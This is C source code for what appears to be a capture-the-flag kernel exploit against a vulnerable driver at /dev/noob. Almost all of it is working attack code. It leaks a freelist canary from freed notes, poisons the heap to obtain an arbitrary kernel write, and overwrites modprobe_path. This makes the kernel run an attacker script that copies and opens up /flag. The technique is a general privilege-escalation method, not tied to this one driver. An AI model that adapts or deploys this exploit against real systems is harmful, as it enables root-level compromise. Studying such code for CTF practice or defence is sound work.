#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>
#include <sys/auxv.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <sys/wait.h>

struct arg
{
    size_t index;
    char *ptr;
    size_t size;
};

void add_note(int fd, size_t index, size_t size)
{
    struct arg input;
    input.index = index;
    input.size = size;
    ioctl(fd, 0x30000, &input);
}

void del_note(int fd, size_t index)
{
    struct arg input;
    input.index = index;
    ioctl(fd, 0x30001, &input);
}

void edit_note(int fd, size_t index, char *ptr, size_t size)
{
    struct arg input;
    input.index = index;
    input.ptr = ptr;
    input.size = size;
    ioctl(fd, 0x30002, &input);
}

void show_note(int fd, size_t index, char *ptr, size_t size)
{
    struct arg input;
    input.index = index;
    input.ptr = ptr;
    input.size = size;
    ioctl(fd, 0x30003, &input);
}

void gen_test(){
    puts("[+] Prepare chmod file.");
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\n' > /home/pwn/a");
    system("chmod +x /home/pwn/a");

    puts("[+] Prepare trigger file.");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/fake");
    system("chmod +x /home/pwn/fake");
}

void exploit()
{
    int fd = open("/dev/noob", O_RDWR);
    size_t mod_base = 0xffffffffc0002000, pool = 0xffffffffc00044c0;
    size_t buf[12] = {0};
    // find victim heap
    int find_heap = 0;
    char *victim_ptr[2] = {0};
    int victim_idx[2] = {0};
    size_t potential_ptr = 0, ptr = 0;
    for (int i = 0; i < 0x18; i++)
    {
        add_note(fd, i, 0x60);
        show_note(fd, i, buf, 0x60);

        if ((buf[5] & 0xffff000000000000) && (buf[5] == buf[6]))
        {
            victim_ptr[find_heap] = (char *)(buf[5] - 0x28);
            victim_idx[find_heap] = i;
            find_heap++;
        }
        memset(buf, 0, 0x60);
        if (find_heap == 2)
            break;
    }
    if (find_heap < 2)
    {
        puts("[-] no enough victim heap!");
        exit(0);
    }
    printf("[+] index: %d, ptr: %lx.\n", victim_idx[0], victim_ptr[0]);
    printf("[+] index: %d, ptr: %lx.\n", victim_idx[1], victim_ptr[1]);
    // leak canary
    del_note(fd, victim_idx[0]);
    del_note(fd, victim_idx[1]);
    show_note(fd, victim_idx[1], buf, 0x60);
    size_t canary = buf[0] ^ (size_t)victim_ptr[0] ^ (size_t)victim_ptr[1];
    printf("[+] leak canary: %lx\n", canary);

    // arbitrary write
    size_t magic = (mod_base ^ canary) >> 32;
    printf("[+] magic: %lx.\n", magic);

    size_t fake_user_mem1 = mmap(magic & 0xffff0000, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,0,0);
    printf("[+] fake_user_mem1: %lx.\n", fake_user_mem1);
    size_t fake_fd1 = magic ^ canary;
    memcpy(magic, &fake_fd1, 8);

    size_t fake_chunk = pool + 0x190 - 4;
    size_t fake_ptr2 = (canary ^ fake_chunk) & 0xffffffff;
    printf("[+] fake_ptr2: %lx.\n", fake_ptr2);
    size_t fake_user_mem2 = mmap(fake_ptr2 & 0xffff0000, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,0,0);
    printf("[+] fake_user_mem2: %lx.\n", fake_user_mem2);
    size_t fake_fd2 = fake_ptr2 ^ canary; 
    memcpy(fake_ptr2, &fake_fd2, 8);

    size_t target0 = (size_t)victim_ptr[1] ^ canary ^ magic;
    size_t target1 = (size_t)victim_ptr[0] ^ canary ^ fake_chunk;
    edit_note(fd, victim_idx[1], &target0, 8);
    edit_note(fd, victim_idx[0], &target1, 8);

    add_note(fd, 0x18, 0x60);
    add_note(fd, 0x19, 0x60);               // pool[19] = magic ^ canary
    del_note(fd, victim_idx[0]);
    edit_note(fd, victim_idx[0], &target1, 8);
    int target_idx = 0x1a;
    for (; target_idx < 0x20; target_idx++)
    {
        add_note(fd, target_idx, 0x60);
        memset(buf, 0, 0x60);
        show_note(fd, target_idx, buf, 8);
        if (buf[0] == (magic << 32))
            break;
    }
    if (target_idx == 0x20)
    {
        puts("[-] not get fake chunk!");
        exit(0);
    }
    printf("[+] index: %d.\n[+] get fake chunk success!\n", target_idx);
    add_note(fd, target_idx + 1, 0x60);
    getchar();
    size_t modprobe_path = 0xffffffff8245aba0;
    char overwrite[12] = {0};
    memcpy(overwrite + 4, &modprobe_path, 8);
    edit_note(fd, target_idx, overwrite, 12);
    char path[12] = "/home/pwn/a\x00";
    edit_note(fd, 0x19, path, 12);
}

int main()
{
    gen_test();
    exploit();
    system("cat /proc/sys/kernel/modprobe");
    return 0;
}
